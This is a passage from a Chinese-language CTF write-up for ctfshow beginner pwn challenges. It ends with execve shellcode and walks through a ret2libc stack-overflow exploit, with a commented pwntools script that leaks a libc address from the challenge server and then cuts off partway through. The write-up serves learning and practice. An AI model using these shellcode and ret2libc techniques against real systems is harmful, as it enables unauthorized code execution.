</span></span><span class="line"><span class="cl">        xor dword ptr <span class="o">[</span>esp<span class="o">]</span>, 0x1016972
</span></span><span class="line"><span class="cl">        xor ecx, ecx
</span></span><span class="line"><span class="cl">        push ecx /* null terminate */
</span></span><span class="line"><span class="cl">        push <span class="m">4</span>
</span></span><span class="line"><span class="cl">        pop ecx
</span></span><span class="line"><span class="cl">        add ecx, esp
</span></span><span class="line"><span class="cl">        push ecx /* <span class="s1">&#39;sh\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        mov ecx, esp
</span></span><span class="line"><span class="cl">        xor edx, edx
</span></span><span class="line"><span class="cl">        /* call execve<span class="o">()</span> */
</span></span><span class="line"><span class="cl">        push <span class="m">11</span> /* 0xb */
</span></span><span class="line"><span class="cl">        pop eax
</span></span><span class="line"><span class="cl">        int 0x80
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/65.png"
	width="1030"
	height="560"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/65_hu_a1098df37bfcfd3b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/65_hu_199a30cfb9c2d5a8.png 1024w"
	loading="lazy"
	
		alt="è°ƒç”¨pwntoolsæ‰€äº§ç”Ÿçš„shellcode"
	
	
		class="gallery-image" 
		data-flex-grow="183"
		data-flex-basis="441px"
	
></p>
<p>çœ‹ç€ç¡®å®æ¯”è¾ƒä¹±&hellip;..ğŸ˜…</p>
<p>æœ€åçš„æœ€åæˆ‘æƒ³å¯¹è¿™é¢˜åšäº›è¯„ä»·ï¼Œå…¶å®é¢˜ä¸éš¾ä¸»è¦æ˜¯æˆ‘åˆæ¬¡åšï¼Œè®²å¾—æ¯”è¾ƒå•°å—¦ï¼Œå¦‚æœä½ ä¼šæ‰‹æ•²shellcodeæˆ–è€…è°ƒç”¨pwntoolsçš„shellcraftæ¨¡å—çš„è¯è¿˜æ˜¯å¾ˆç®€å•ç§’æ‰çš„ã€‚åªèƒ½æ€ªå°ç”Ÿå¤ªcaiäº†ğŸ˜„</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/67.png"
	width="856"
	height="304"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/67_hu_12ec48f01ef5c991.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/67_hu_825f43a0aef1cbbe.png 1024w"
	loading="lazy"
	
		alt="é¡ºåˆ©å®Œæˆexecveç³»ç»Ÿè°ƒç”¨ï¼Œå¾—ä»¥è¿›è¡Œäº¤äº’"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="675px"
	
></p>
<p>å¤§è‡´æ€è·¯çŸ¥é“å°±å¥½ï¼Œé¶æœºçš„flagæ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚</p>
<h3 id="pwn_025">PWN_025
</h3><p>é¢˜ç›®ï¼šå¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc</p>
<p>æ ¹æ®é¢˜ç›®ï¼Œä¹Ÿå°±æ˜¯è¯´å…·ä½“æ”»å‡»æ‰‹æ³•ä¸ºï¼š<code>ret2libc</code></p>
<h4 id="ret2libcæ”»å‡»">ret2libcæ”»å‡»
</h4><p><code>ret2libc</code> æ˜¯ä¸€ç§åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ä¸­çš„ç»å…¸æŠ€æœ¯ï¼Œå…¨ç§°ä¸º â€œreturn - to - libcâ€ï¼Œä¸­æ–‡å¯ç†è§£ä¸º â€œè¿”å›è‡³ libc åº“â€ï¼Œå¸¸ç”¨äºç»•è¿‡æ ˆä¸å¯æ‰§è¡Œï¼ˆ<code>NX</code>ï¼ŒNo - eXecuteï¼‰ä¿æŠ¤æœºåˆ¶ã€‚</p>
<blockquote>
<h4 id="ret2libcå®ç°æ­¥éª¤">ret2libcå®ç°æ­¥éª¤
</h4><ol>
<li><strong>ä¿¡æ¯æ³„æ¼</strong>ï¼šé€šè¿‡æ ˆæº¢å‡ºæ¼æ´ï¼Œç»“åˆä¸€äº›å‡½æ•°ï¼ˆå¦‚ <code>write</code> å‡½æ•°ï¼‰ï¼Œæ³„æ¼å‡ºç¨‹åºä¸­ <code>libc</code> åº“å‡½æ•°çš„çœŸå®åœ°å€ã€‚å› ä¸ºåœ¨ä¸åŒç³»ç»Ÿä¸­ï¼Œ<code>libc</code> åº“åŠ è½½çš„åŸºåœ°å€æ˜¯éšæœºçš„ï¼ˆ<code>ASLR</code> ä¿æŠ¤æœºåˆ¶ï¼‰ï¼Œä½†åº“å†…å‡½æ•°ä¹‹é—´çš„ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆè·å–ä¸€ä¸ªå·²çŸ¥å‡½æ•°ï¼ˆæ¯”å¦‚ <code>write</code> ï¼‰çš„çœŸå®åœ°å€ï¼Œè¿›è€Œè®¡ç®—å‡ºå…¶ä»–å‡½æ•°ï¼ˆå¦‚ <code>system</code> ï¼‰çš„åœ°å€ã€‚</li>
<li><strong>è®¡ç®—å…³é”®åœ°å€</strong>ï¼šæ ¹æ®æ³„æ¼å‡ºçš„ <code>libc</code> å‡½æ•°åœ°å€ï¼Œè®¡ç®—å‡º <code>system</code> å‡½æ•°åœ°å€å’Œ <code>/bin/sh</code> å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ç”±äº <code>libc</code> ä¸­å‡½æ•°å’Œå­—ç¬¦ä¸²çš„ç›¸å¯¹ä½ç½®å›ºå®šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å·²çŸ¥å‡½æ•°åœ°å€ä¸åç§»é‡æ¥è®¡ç®—å…¶ä»–å…³é”®åœ°å€ã€‚</li>
<li><strong>æ„é€  payload</strong>ï¼šå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ„é€ åˆé€‚çš„ payloadã€‚payload ä¸€èˆ¬åŒ…å«å¡«å……æ•°æ®ï¼ˆç”¨äºå¡«æ»¡ç¼“å†²åŒºç›´åˆ°è¦†ç›–è¿”å›åœ°å€ï¼‰ã€<code>system</code> å‡½æ•°åœ°å€ï¼ˆè¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè¿”å›æ—¶è·³è½¬åˆ° <code>system</code> å‡½æ•°ï¼‰ã€ä¸€ä¸ªæ— æ•ˆçš„è¿”å›åœ°å€ï¼ˆ<code>system</code> å‡½æ•°æ‰§è¡Œå®Œåè¦è¿”å›çš„åœ°å€ï¼Œéšä¾¿å¡«å……ä¸€ä¸ªåœ°å€ï¼Œå› ä¸ºè·å–åˆ° shell åé€šå¸¸ä¸ä¼šå†å…³æ³¨è¿™ä¸ªè¿”å›æ“ä½œ ï¼‰ã€<code>/bin/sh</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆä½œä¸º <code>system</code> å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ · <code>system</code> å‡½æ•°æ‰§è¡Œæ—¶å°±ç›¸å½“äºæ‰§è¡Œäº† <code>system(&quot;/bin/sh&quot;)</code> ï¼Œä»è€Œæ‰“å¼€ä¸€ä¸ª shell ï¼‰ã€‚</li>
<li><strong>å‘é€ payload</strong>ï¼šå°†æ„é€ å¥½çš„ payload å‘é€ç»™å­˜åœ¨æ¼æ´çš„ç¨‹åºï¼Œä½¿ç¨‹åºæŒ‰ç…§æ”»å‡»è€…æœŸæœ›çš„æµç¨‹æ‰§è¡Œï¼Œæœ€ç»ˆè·å–åˆ°ä¸€ä¸ªäº¤äº’å¼ shellï¼Œè¾¾åˆ°æ¼æ´åˆ©ç”¨çš„ç›®çš„ã€‚</li>
</ol>
</blockquote>
<p>checksecä¸€ä¸‹ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç”¨shellcodeäº†ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/68.png"
	width="746"
	height="164"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/68_hu_a99ea644fc591014.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/68_hu_74f646b65d73e4a1.png 1024w"
	loading="lazy"
	
		alt="x32"
	
	
		class="gallery-image" 
		data-flex-grow="454"
		data-flex-basis="1091px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/86.png"
	width="716"
	height="251"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/86_hu_ad09145c80ebcfc7.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/86_hu_102f231e16202428.png 1024w"
	loading="lazy"
	
		alt="F5åç¼–è¯‘æŸ¥çœ‹mainä»£ç "
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87.png"
	width="670"
	height="225"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87_hu_4b1328521ea80b77.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87_hu_6142d0f1d51ae79b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="714px"
	
></p>
<p>å¯ä»¥å‘ç°bufå¤§å°ä¸º 132 å­—èŠ‚ï¼Œä½†readå…è®¸è¯»å– 0x100ï¼ˆ256ï¼‰å­—èŠ‚å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>è·Ÿè¿›writeå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87%EF%BC%881%EF%BC%89.png"
	width="726"
	height="135"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87%EF%BC%881%EF%BC%89_hu_e35dedabfd39796d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/87%EF%BC%881%EF%BC%89_hu_f0ccf21542fa3cb6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="537"
		data-flex-basis="1290px"
	
></p>
<p>IDAx32åˆ†æï¼Œä¹Ÿæ²¡æœ‰/bin/shã€åé—¨systemï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/69.png"
	width="1324"
	height="545"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/69_hu_6b3b5c81b042741f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/69_hu_60765907f2428b45.png 1024w"
	loading="lazy"
	
		alt="æ— /bin/shè·¯å¾„"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="583px"
	
></p>
<p>è¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨åˆ©ç”¨libcï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰çš„systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²ï¼ˆè¿™é¢˜æ€è·¯å¾ˆç±»ä¼¼PWN_024çš„ç¼–å†™shellcodeä¸€æ ·ï¼Œç¨‹åºæœ¬èº«æ²¡æœ‰åé—¨å¯å…¥åªèƒ½ä»å¤–éƒ¨é“¾æ¥è¿›è¿™äº›å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°è¿›å…¥äº¤äº’&hellip;ï¼‰ï¼Œè¿™äº›ä¸œè¥¿åœ¨ç¨‹åºè¿è¡Œæ—¶çš„çœŸå®åœ°å€è®¡ç®—æ–¹æ³•ä¸ºï¼š<code>@gotçœŸå®åœ°å€ = libcåŸºå€ + åç§»</code>ï¼Œæ‰€ä»¥è¦å…ˆè®¡ç®—å‡º<strong>åç§»</strong>ã€‚</p>
<p>ä»¥writeå‡½æ•°ä¸ºä¾‹ ï¼Œåç§» = çœŸå®åœ°å€ - libcåŸºå€ï¼ŒçœŸå®åœ°å€å­˜åœ¨write@gotã€write@gotå¯ä»¥é€šè¿‡write@pltæ¥è¿è¡Œè¿™ä¸ªå‡½æ•°ä»è€Œæ³„éœ²å‡ºæ¥ï¼Œlibc ç‰ˆæœ¬å’ŒåŸºå€å¯ä»¥å¯¼å…¥ libcSearcher åº“æ¥æŸ¥æ‰¾è®¡ç®—è¿™é‡Œéœ€è¦å»ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹åŠ¨æ€é“¾æ¥çš„è¿‡ç¨‹ï¼ˆ<a class="link" href="https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot"  target="_blank" rel="noopener"
    >æœ‰å…³.gotã€.pltè¡¨çš„çŸ¥è¯†</a>ï¼‰ï¼Œç®€å•ç”»ä¸ªå›¾è¯´æ˜ä¸€ä¸‹é»„è‰²éƒ¨åˆ†æ˜¯é™æ€çš„ï¼Œç»¿è‰²éƒ¨åˆ†æ˜¯åŠ¨æ€å˜åŒ–çš„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/88.png"
	width="742"
	height="207"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/88_hu_f4cd45bfba752e2c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/88_hu_6305d23fee54b4e3.png 1024w"
	loading="lazy"
	
		alt="åŠ¨æ€é“¾æ¥åº“çš„è¿‡ç¨‹"
	
	
		class="gallery-image" 
		data-flex-grow="358"
		data-flex-basis="860px"
	
></p>
<p>elf.got[&lsquo;write&rsquo;]çš„ä½œç”¨æ˜¯è·å– writeå‡½æ•°çœŸå®åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œå³write@gotçš„åœ°å€ï¼›</p>
<p>elf.plt[&lsquo;write&rsquo;]çš„ä½œç”¨æ˜¯è·å– writeå‡½æ•°è·³æ¿åœ°å€çš„å­˜å‚¨ä½ç½®ï¼Œå³write@pltçš„åœ°å€ï¼›</p>
<blockquote>
<p>å…·ä½“æ€è·¯ï¼š</p>
<ol>
<li>è§£æç›®æ ‡ç¨‹åºçš„ ELF æ–‡ä»¶ï¼Œè¯»å–write@pltçš„åœ°å€ ã€write@gotçš„åœ°å€å’Œctfshowçš„å‡½æ•°åœ°å€ã€‚</li>
<li>ä»¥æ ˆæº¢å‡ºæ¼æ´ä½œä¸ºå…¥å£ï¼Œè·³è½¬åˆ°write@pltæ‰§è¡Œå‡½æ•°æ³„éœ²write@gotçš„åœ°å€ï¼Œå†è·³è½¬å›ctfshowå‡½æ•°ã€‚</li>
<li>è¯»å–æ³„éœ²å‡ºçš„write@gotçš„åœ°å€ï¼Œç”¨ libcSearcher åº“æŸ¥æ‰¾æ­£ç¡®çš„ libc ç‰ˆæœ¬ï¼Œå†è®¡ç®—åç§»ã€‚</li>
<li>è®¡ç®—systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²çš„çœŸå®åœ°å€ã€‚</li>
<li>ç»§ç»­ä»ctfshowå‡½æ•°é‡Œçš„æ ˆæº¢å‡ºä½œä¸ºå…¥å£ï¼Œè·³è½¬åˆ°systemå‡½æ•°çœŸå®åœ°å€ï¼ŒåŒæ—¶å°†/bin/shä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œä»è€Œæ‹¿åˆ°æƒé™ã€‚</li>
</ol>
</blockquote>
<blockquote>
<p>è¿™é‡Œä¹‹å‰æˆ‘æ˜¯è·³è¿‡çš„ï¼Œæ¯”è¾ƒéš¾ï¼Œæˆ‘åšåˆ°PWN_044ä¹‹åæ‰å€’å›æ¥åšçš„ã€‚</p>
<p>PWN044 çš„åˆ©ç”¨é€»è¾‘æ˜¯ â€œå…ˆè°ƒç”¨ <code>gets</code> å‘ <code>bss</code> æ®µå†™å…¥ <code>/bin/sh</code>ï¼Œå†è°ƒç”¨ <code>system</code> æ‰§è¡Œâ€ï¼ˆç±»ä¼¼æ–‡æ¡£ä¸­ PWN044 çš„ <code>gets</code> è°ƒç”¨åœºæ™¯ï¼‰ã€‚æ­¤æ—¶è°ƒç”¨ <code>gets</code> ä»…éœ€å…¶ â€œå‡½æ•°å…¥å£â€ å³å¯å®Œæˆæ•°æ®å†™å…¥ï¼Œæ— éœ€çŸ¥é“ <code>gets</code> åœ¨ <code>libc</code> ä¸­çš„çœŸå®åœ°å€ â€”â€” ç›´æ¥ä½¿ç”¨ <code>gets</code> çš„ PLT è¡¨åœ°å€ï¼ˆ<code>p32(gets)</code> æœ¬è´¨æ˜¯ <code>p32(gets_plt)</code>ï¼‰ï¼Œå°±èƒ½è§¦å‘ <code>gets</code> æ‰§è¡Œï¼Œå®ç°å†™å…¥ <code>/bin/sh</code> çš„ç›®æ ‡ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨PWN_044æ˜¯ç›´æ¥æ˜¯p32(gets)ï¼Œè€Œåœ¨è¿™è°ƒç”¨writeå‡½æ•°æ˜¯è¦åˆ†.gotå’Œ.pltï¼Œå› ä¸ºå®ƒä¿©åŠŸèƒ½éƒ½ä¸åŒã€‚</p>
<p><code>write_plt</code> è´Ÿè´£ â€œè§¦å‘ <code>write</code> æ‰§è¡Œâ€ï¼Œ<code>write_got</code> è´Ÿè´£ â€œæä¾›å¾…æ³„éœ²çš„çœŸå®åœ°å€â€ï¼ŒäºŒè€…ç¼ºä¸€ä¸å¯ï¼Œå› æ­¤å¿…é¡»æ˜ç¡®åŒºåˆ†ã€‚</p>
</blockquote>
<p><strong>æ€»ä¹‹ï¼šret2libc æ ¸å¿ƒé€»è¾‘ï¼šâ€œæ³„éœ²åœ°å€â†’è®¡ç®—åœ°å€â†’æ„é€ è°ƒç”¨â€</strong></p>
<p>expå¤‡æ³¨ç‰ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># å¯¼å…¥pwntoolsåº“ï¼Œæä¾›æ¼æ´åˆ©ç”¨å¸¸ç”¨åŠŸèƒ½ï¼ˆå¦‚è¿æ¥ã€æ‰“åŒ…ç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># å¯¼å…¥LibcSearcherï¼Œç”¨äºæ ¹æ®æ³„éœ²çš„å‡½æ•°åœ°å€æŸ¥æ‰¾å¯¹åº”libcç‰ˆæœ¬</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œæ˜¾ç¤ºè¯¦ç»†çš„äº¤äº’è¿‡ç¨‹ï¼ˆæ–¹ä¾¿è°ƒè¯•ï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å»ºç«‹ä¸ç›®æ ‡æœåŠ¡çš„è¿æ¥ï¼ˆè¿œç¨‹æœåŠ¡å™¨åœ°å€å’Œç«¯å£ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28298</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ è½½ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè·å–ç¬¦å·ä¿¡æ¯ï¼ˆå¦‚å‡½æ•°åœ°å€ã€GOTè¡¨åœ°å€ç­‰ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–mainå‡½æ•°çš„åœ°å€ï¼ˆç”¨äºç¬¬ä¸€æ¬¡æº¢å‡ºåè·³å›mainå‡½æ•°ï¼Œè¿›è¡ŒäºŒæ¬¡æ”»å‡»ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–writeå‡½æ•°çš„GOTè¡¨åœ°å€ï¼ˆGlobal Offset Tableï¼Œå­˜å‚¨å‡½æ•°çš„çœŸå®å†…å­˜åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è·å–writeå‡½æ•°çš„PLTè¡¨åœ°å€ï¼ˆProcedure Linkage Tableï¼Œç”¨äºé—´æ¥è°ƒç”¨å‡½æ•°ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬ä¸€æ¬¡æ”»å‡»çš„payloadï¼ˆæ ˆæº¢å‡ºåˆ©ç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. å¡«å……ç¼“å†²åŒºåˆ°è¿”å›åœ°å€ï¼š0x88æ˜¯ç¼“å†²åŒºå¤§å°ï¼Œ0x4æ˜¯ebpå¯„å­˜å™¨å¤§å°ï¼ˆ32ä½ç¨‹åºï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2. è¿”å›åœ°å€ï¼šè¦†ç›–ä¸ºwrite@pltï¼ˆè°ƒç”¨writeå‡½æ•°è¾“å‡ºæ•°æ®ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 3. writeæ‰§è¡Œå®Œåè·³è½¬çš„åœ°å€ï¼šmainå‡½æ•°ï¼ˆå›åˆ°ç¨‹åºå¼€å¤´ï¼Œæ–¹ä¾¿ç¬¬äºŒæ¬¡æ”»å‡»ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 4. writeå‡½æ•°çš„å‚æ•°1ï¼šæ–‡ä»¶æè¿°ç¬¦0ï¼ˆé”™è¯¯ï¼åº”ä¸º1ï¼Œstdoutæ ‡å‡†è¾“å‡ºï¼Œå¦åˆ™æ— æ³•æ­£ç¡®æ³„éœ²æ•°æ®ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 5. writeå‡½æ•°çš„å‚æ•°2ï¼šè¦æ³„éœ²çš„åœ°å€ï¼ˆwrite@gotï¼Œå­˜å‚¨writeçš„çœŸå®å†…å­˜åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 6. writeå‡½æ•°çš„å‚æ•°3ï¼šæ³„éœ²çš„å­—èŠ‚æ•°ï¼ˆ4å­—èŠ‚ï¼Œ32ä½åœ°å€é•¿åº¦ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€ç¬¬ä¸€æ¬¡payloadï¼Œè§¦å‘æ ˆæº¢å‡ºï¼Œæ‰§è¡Œwriteå‡½æ•°æ³„éœ²åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¥æ”¶æ³„éœ²çš„writeå‡½æ•°çœŸå®åœ°å€ï¼ˆ4å­—èŠ‚ï¼Œ32ä½ï¼‰ï¼Œå¹¶è½¬æ¢ä¸ºæ•´æ•°</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write</span><span class="p">))</span>  <span class="c1"># æ‰“å°æ³„éœ²çš„åœ°å€ï¼ˆåå…­è¿›åˆ¶ï¼‰</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä½¿ç”¨LibcSearcheræ ¹æ®writeå‡½æ•°åœ°å€æŸ¥æ‰¾å¯¹åº”çš„libcç‰ˆæœ¬</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">,</span> <span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—libcçš„åŸºåœ°å€ï¼šlibcåŸºåœ°å€ = æ³„éœ²çš„å‡½æ•°åœ°å€ - è¯¥å‡½æ•°åœ¨libcä¸­çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—systemå‡½æ•°çš„åœ°å€ï¼šsystemåœ°å€ = libcåŸºåœ°å€ + systemåœ¨libcä¸­çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># è®¡ç®—&#34;/bin/sh&#34;å­—ç¬¦ä¸²çš„åœ°å€ï¼šbin_shåœ°å€ = libcåŸºåœ°å€ + å­—ç¬¦ä¸²åœ¨libcä¸­çš„åç§»é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ„é€ ç¬¬äºŒæ¬¡æ”»å‡»çš„payloadï¼ˆè·å–shellï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1. åŒæ ·çš„å¡«å……ï¼šè¦†ç›–ç¼“å†²åŒºå’Œebp</span>
